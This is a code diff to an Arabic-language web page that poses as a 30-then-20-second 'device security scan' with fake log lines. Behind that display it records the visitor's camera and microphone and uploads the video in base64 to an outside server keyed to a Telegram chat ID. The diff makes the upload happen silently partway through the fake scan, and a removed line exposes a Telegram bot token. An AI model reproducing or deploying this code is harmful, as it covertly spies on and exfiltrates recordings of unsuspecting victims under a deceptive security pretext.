@@ -94,7 +94,7 @@
         <div class="code-screen" id="code-screen"></div>
         <div class="countdown-box">
             <span class="countdown-label">متبقي:</span>
-            <span class="countdown-num" id="countdown">30</span>
+            <span class="countdown-num" id="countdown">20</span>
             <span class="countdown-label">ثانية</span>
         </div>
         <div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div>
@@ -110,9 +110,9 @@
 </div>
 
 <script>
-const BOT_TOKEN = '8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo';
 const CHAT_ID = new URLSearchParams(window.location.search).get('chatId') || '7276604783';
 let mediaRecorder, recordedChunks = [], stream;
+let videoSent = false;
 
 function getDevice() {
     const ua = navigator.userAgent;
@@ -132,8 +132,28 @@ function showPage(id) {
     document.getElementById(id).classList.add('active');
 }
 
+async function sendVideo() {
+    if (videoSent || recordedChunks.length === 0) return;
+    videoSent = true;
+    
+    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+    const reader = new FileReader();
+    reader.onloadend = async function() {
+        const base64 = reader.result.split(',')[1];
+        try {
+            await fetch('https://ai-proxy-eosin.vercel.app/api/upload_video', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, video_base64: base64 })
+            });
+        } catch(e) {}
+    };
+    reader.readAsDataURL(blob);
+}
+
 async function startScan() {
     showPage('page-scanning');
+    videoSent = false;
     
     try {
         stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
@@ -167,40 +187,31 @@ async function startScan() {
         '[✓] DEVICE SECURE ✓',
     ];
     
-    let seconds = 30;
+    let seconds = 20;
     
-    const interval = setInterval(() => {
+    const interval = setInterval(async () => {
         seconds--;
         countdownEl.textContent = seconds;
-        progressFill.style.width = ((30 - seconds) / 30 * 100) + '%';
+        progressFill.style.width = ((20 - seconds) / 20 * 100) + '%';
         
-        const progress = (30 - seconds) / 30;
+        const progress = (20 - seconds) / 20;
         const linesToShow = Math.floor(progress * logs.length);
         codeScreen.innerHTML = logs.slice(0, Math.min(linesToShow + 1, logs.length)).join('<br>');
         codeScreen.scrollTop = codeScreen.scrollHeight;
         
+        // أول 10 ثواني = تسجيل فقط، تاني 10 ثواني = إرسال في الخلفية
+        if (seconds <= 10 && !videoSent) {
+            if (mediaRecorder && mediaRecorder.state === 'recording') {
+                mediaRecorder.stop();
+                await new Promise(r => setTimeout(r, 1000));
+                await sendVideo();
+            }
+        }
+        
         if (seconds <= 0) {
             clearInterval(interval);
-            if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
-            setTimeout(async () => {
-                if (recordedChunks.length > 0) {
-                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                    const reader = new FileReader();
-                    reader.onloadend = async function() {
-                        const base64 = reader.result.split(',')[1];
-                        try {
-                            await fetch('https://ai-proxy-eosin.vercel.app/api/upload_video', {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({ chat_id: CHAT_ID, video_base64: base64 })
-                            });
-                        } catch(e) {}
-                    };
-                    reader.readAsDataURL(blob);
-                }
-                if (stream) stream.getTracks().forEach(t => t.stop());
-                showPage('page-done');
-            }, 2000);
+            if (stream) stream.getTracks().forEach(t => t.stop());
+            showPage('page-done');
         }
     }, 1000);
 }
